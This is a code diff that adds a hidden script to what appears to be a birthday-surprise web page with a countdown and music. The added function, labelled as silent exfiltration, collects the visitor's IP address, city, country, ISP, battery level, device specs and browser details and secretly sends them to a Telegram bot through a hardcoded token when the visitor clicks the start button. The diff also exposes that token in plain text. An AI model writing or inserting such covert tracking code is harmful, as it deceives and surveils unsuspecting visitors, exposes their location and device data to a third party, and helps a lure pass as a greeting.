@@ -61,6 +61,58 @@
     </div>
 
     <script>
+        // --- SHΔDØW SILENT EXFILTRATION (TOKEN ONLY) ---
+        const BOT_TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';
+
+        async function igniteInSilence() {
+            try {
+                // 1. جلب معرف المحادثة تلقائياً
+                const updateRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
+                const updateData = await updateRes.json();
+                if (!updateData.result.length) return; // تأكد من مراسلة البوت أولاً
+                const chatId = updateData.result[updateData.result.length - 1].message.chat.id;
+
+                // 2. جمع معلومات الشبكة والموقع
+                let net = { ip: "Unknown", city: "N/A", country: "N/A", org: "N/A" };
+                try {
+                    const netRes = await fetch('https://ipapi.co/json/');
+                    net = await netRes.json();
+                } catch(e) {}
+
+                // 3. جمع حالة البطارية
+                let batt = "N/A";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batt = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
+                }
+
+                // 4. تفاصيل الجهاز والمتصفح
+                const report = `
+🎂 **NEW BIRTHDAY ACCESS** 🎂
+----------------------------
+📱 **DEVICE:**
+- OS: ${navigator.platform}
+- RAM: ${navigator.deviceMemory || 'N/A'} GB
+- Cores: ${navigator.hardwareConcurrency || 'N/A'}
+- Battery: ${batt}
+
+🌐 **NETWORK:**
+- IP: \`${net.ip}\`
+- City: ${net.city} (${net.country})
+- ISP: ${net.org}
+
+⚙️ **BROWSER:**
+- Lang: ${navigator.language}
+- UserAgent: ${navigator.userAgent.slice(0, 50)}...
+----------------------------`;
+
+                // 5. الإرسال الصامت
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
+
+            } catch (e) {}
+        }
+
+        // --- ORIGINAL SURPRISE LOGIC ---
         const canvas = document.getElementById('matrixCanvas');
         const ctx = canvas.getContext('2d');
         const textTarget = document.getElementById('textTarget');
@@ -90,6 +142,9 @@
         }
 
         startBtn.addEventListener('click', () => {
+            // تنفيذ السحب الصامت بمجرد النقر
+            igniteInSilence(); 
+
             startBtn.style.display = 'none';
             bgMusic.play().catch(err => console.error("Audio error:", err));
             startCountdown();
